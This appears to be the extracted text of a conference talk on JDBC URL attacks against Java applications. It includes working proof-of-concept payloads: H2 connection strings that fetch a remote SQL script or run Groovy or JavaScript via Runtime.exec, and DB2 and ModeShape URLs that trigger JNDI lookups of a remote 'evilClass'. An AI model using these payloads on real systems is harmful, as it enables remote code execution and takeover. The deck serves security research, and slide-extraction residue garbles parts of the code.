Make JDBC Attack Brilliant Again
Chen Hongkun(@Litch1) | Xu Yuanzhen(@pyn3rd)
TRACK 2
Your Designation, Company Name Here
1.The derivation of JDBC
attacking
2.In-depth analysis of occurred implementations
3.Set fire on JDBC of diverse applications
Agenda
1.The derivation of JDBC
attacking
2.In-depth analysis of occurred implementations
3.Set fire on JDBC of diverse applications
Agenda
Java Database Connectivity
What is the JDBC?
JDBCMysqlImpl
MySQL
JDBC
JDBCOracleImpl
JDBCSQLServerIm
pl
JDBCDB2mpl
Oracle
MsSQL
DB2
JDBC Driver
Standard Interface
Callback
Java Application
Not Recommended
Unportable
Callback
set evil JDBC URL
establish JDBC connection
execute payload with JDBC driver
Controllable JDBC URL
Class.forName(" com.mysql.cj.jdbc.Driver");
String url = "jdbc:mysql://localhost:3306/hitb"
Connection conn = DriverManager.getConnection(url)
1.The derivation of JDBC
attacking
2.In-depth analysis of occurred implementations
3.Set fire on JDBC of diverse applications
Agenda
Agenda
MySQL Client Arbitrary File Reading Vulnerability
• Affect many clients including JDBC driver
• LOAD DATA LOCAL INFILE statement
establish JDBC connection
greeting packet
query packet
file transfer packet
Server
Client
MySQL JDBC Client Deserialization Vulnerability
establish JDBC connection
read evil object from server
deserialize evil object
• Affected MySQL JDBC driver need to support specific properties
• gadgets are necessary
Server
Client
MySQL Connector/J – CVE-2017-3523
MySQL Connector/J offers features to support for automatic serialization 
and deserialization of Java objects, to make it easy to store arbitrary 
objects in the database
The flag "useServerPrepStmts" is set true to make MySQL Connector/J use 
server-side prepared statements
The application is reading from a column having type BLOB, or the similar 
TINYBLOB, MEDIUMBLOB or LONGBLOB
The application is reading from this column using .getObject() or one of 
the functions reading numeric values (which are first read as strings and 
then parsed as numbers).
if (field.isBinary() || field.isBlob()) {
byte[] data = getBytes(columnIndex);
if (this.connection.getAutoDeserialize()) {
Object obj = data;
if ((data != null) && (data.length >= 2)) {
if ((data[0] == -84) && (data[1] == -19)) {
// Serialized object?
try {
ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
ObjectInputStream objIn = new ObjectInputStream(bytesIn);
obj = objIn.readObject();
objIn.close();
bytesIn.close();
} catch (ClassNotFoundException cnfe) {
throw SQLError.createSQLException(Messages.getString("ResultSet.Class_not_found___91") + cnfe.toString()
+ Messages.getString("ResultSet._while_reading_serialized_object_92"), getExceptionInterceptor());
} catch (IOException ex) {
obj = data; // not serialized?
}
} else {
return getString(columnIndex);
}
}
return obj;
}
return data;
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
Properties
Properties
queryInterceptors
Versions
8.x
6.x
statementInterceptors
com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
>=5.1.11
 assistant");
if (！isNested())
this._createJDBCDataSourceForm = form = new CreateJDBCDataSourceForm( );
form.setName(getUniqueName("jdbc.datasources.createidbcdatasource.name. seed"));
form.setDatasourceType("GENERIC")
form.setCSRFToken(CSRFUtils.getSecret(getRequest()));
try {
ArrayListsLabelvalueBean > databaseTypes = getDatabaseTypes();
form.setDatabaseTypes(databaseTypes);
for (Iterator iter = databaseTypes.iterator(); iter.hasNext(); ) {
LabelvalueBean lvb = iter.next();
if (lvb.getvalue().equals("Oracle")) {
form.setSelectedDatabaseType(lvb.getValue());
break
}
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
Weblogic Case - CVE-2020-2934
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
Spring Boot H2 console Case Study
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'
JBoss/Wildfly Case
H2 RCE
How to bypass the restriction of network?
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'
Construct payload with Groovy AST Transformations
Why we use command "RUNSCRIPT"?
INIT = RUNSCRIPT FROM 'http://ip:port/poc.sql'
single line SQL
if (init != null) {
try {
CommandInterface command = session.prepareCommand(init,
Integer.MAX_VALUE);
command.executeUpdate(null);
} catch (DbException e) {
if (!ignoreUnknownSetting) {
session.close();
throw e;
}
}
}
1
2
3
4
5
6
7
8
9
10
11
12
13
In-depth analysis of source code
CREATE ALIAS RUNCMD AS $$$$;
CALL RUNCMD(command)
org.h2.util.SourceCompiler
javax.tools.JavaCompiler#getTask
javax.script.Compilable#compile
groovy.lang.GroovyCodeSource#parseClass
Java Source Code
JavaScript Source Code
Groovy Source Code
multiple lines SQL
Class compiledClass = compiled.get(packageAndClassName);
if (compiledClass != null) {
return compiledClass;
}
String source = sources.get(packageAndClassName);
if (isGroovySource(source)) {
Class clazz = GroovyCompiler.parseClass(source, packageAndClassName);
compiled.put(packageAndClassName, clazz);
return clazz;
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
Groovy Source Code
public static void main (String[] args) throws ClassNotFoundException, SQLException {
String groovy = "@groovy.transform.ASTTest(value={" +
"    assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")" +
"})" +
"def x";
String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '"+ groovy +
"'";
Connection conn = DriverManager.getConnection(url);
conn.close();
use @groovy.transform.ASTTEST to perform assertions on the AST
GroovyClassLoader.parseClass(…)
Groovy dependency is necessary?
private Trigger loadFromSource() {
SourceCompiler compiler = database.getCompiler();
synchronized (compiler) {
String fullClassName = Constants.USER_PACKAGE + ".trigger." + getName();
compiler.setSource(fullClassName, triggerSource);
try {
if (SourceCompiler.isJavaxScriptSource(triggerSource)) {
return (Trigger) compiler.getCompiledScript(fullClassName).eval();
} else {
final Method m = compiler.getMethod(fullClassName);
if (m.getParameterTypes().length > 0) {
throw new IllegalStateException("No parameters are allowed for a
trigger");
}
return (Trigger) m.invoke(null);
}
} catch (DbException e) {
throw e;
} catch (Exception e) {
throw DbException.get(ErrorCode.SYNTAX_ERROR_1, e, triggerSource);
}
}
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
"CREATE TRIGGER" NOT only compile but also invoke eval
public static void main (String[] args) throws ClassNotFoundException, SQLException {
String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculat
or\")";
String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON 
INFORMATION_SCHEMA.CATALOGS AS '"+ javascript +"'";
Connection conn = DriverManager.getConnection(url);
conn.close();
1.The derivation of JDBC
attacking
2.In-depth analysis of occurred implementations
3.Set fire on JDBC of diverse applications
Agenda
Agenda
IBM DB2 Case 
clientRerouteServerListJNDINameIdentifies
a JNDI reference to a DB2ClientRerouteServerList instance in a JNDI repository of 
reroute server information.clientRerouteServerListJNDIName applies only to IBM Data 
Server Driver for JDBC and SQLJ type 4 connectivity, and to connections that are 
established through the DataSource interface.
If the value of clientRerouteServerListJNDIName is not null, 
clientRerouteServerListJNDIName provides the following functions:
•
Allows information about reroute servers to persist across JVMs
•
Provides an alternate server location if the first connection to the data source fails
public class c0 impLements PrivilegedExceptionAction { 
private Context a = null;
private String b;
public c0(Context var1, String var2) {
this.a = var1;
this.b = var2;
}
public Object run() throws NamingException { 
return this.a.Lookup(this.b);
}
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
Pursue Root Cause
Pursue Root Cause
Set JDBC URL
Connect Succeeded
Lookup ServerList
Load Remote Codebase
Connect Failed
JDNI Injection RCE
Database
Manipulation
Make JNDI Injection RCE
clientRerouteServerListJNDIName = ldap://127.0.0.1:1389/evilClass;
public class DB2Test {
public static void main(String[] args) throws Exception {
Class.forName("com.ibm.db2.jcc.DB2Driver");
DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=
ldap://127.0.0.1:1389/evilClass;");
}
}
Java Content Repository
Implementations
Jackrabbit (Apache)
CRX (Adobe)
ModeShape
eXo Platform
Oracle Beehive
ModeShape
• JCR 2.0 implementation
• Restful APIs
• Sequencers
• Connectors
• …
JCR Connectors
Use JCR API to access data from other systems
E.g. filesystem, Subversion, JDBC metadata…
?
ModeShape
JCR Repository
JCR Client
Application
ModeShape Gadget
JCR Repositories involving JDBC
public class ModeShapeTest {
public static void main(String[] args) throws Exception {
Class.forName("org.modeshape.jdbc.LocalJcrDriver");
DriverManager.getConnection("jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass");
}
}
• A JNDI URL that points the hierarchical database to an existing repository 
• A JNDI URL that points the hierarchical database to an evil LDAP service 
jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass
jdbc:jcr:jndi:jcr:?repositoryName=repository
public class Socketconnection {
private final Socket socket;
private final ObjectOutputStream objOutputStream;
Private final ObjectInputstream objInputStream;
public SocketConnection(Socket var1) throws IOException {
this.socket = var1;
this.objOutputStream = new ObjectOutputStream(var1.getOutputStream());
this.objInputStream = new ObjectInputStream(var1.getInputStream());
}
public Object readMessage() throws cLassNotFoundException, IOException {  
return this.objInputStream.readObject();
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
Apache Derby
private class MasterReceiverThread extends Thread {
private final ReplicationMessage pongMsg = new ReplicationMessage(14, (Object)null);
MasterReceiverThread(String var2) {
super("derby.master.receiver-" + var2);
}
public void run() {
while(!ReplicationMessageTransmit.this.stopMessageReceiver) {
try {
ReplicationMessage var1 = this.readMessage();
switch(var1.getType()) {
case 11:
case 12:
synchronized(ReplicationMessageTransmit.this.receiveSemaphore) {
ReplicationMessageTransmit.this.receivedMsg = var1;
ReplicationMessageTransmit.this.receiveSemaphore.notify();
break;
}
case 13:
ReplicationMessageTransmit.this.sendMessage(this.pongMsg);
}
}
}
}
1
2
3
4
5
6
7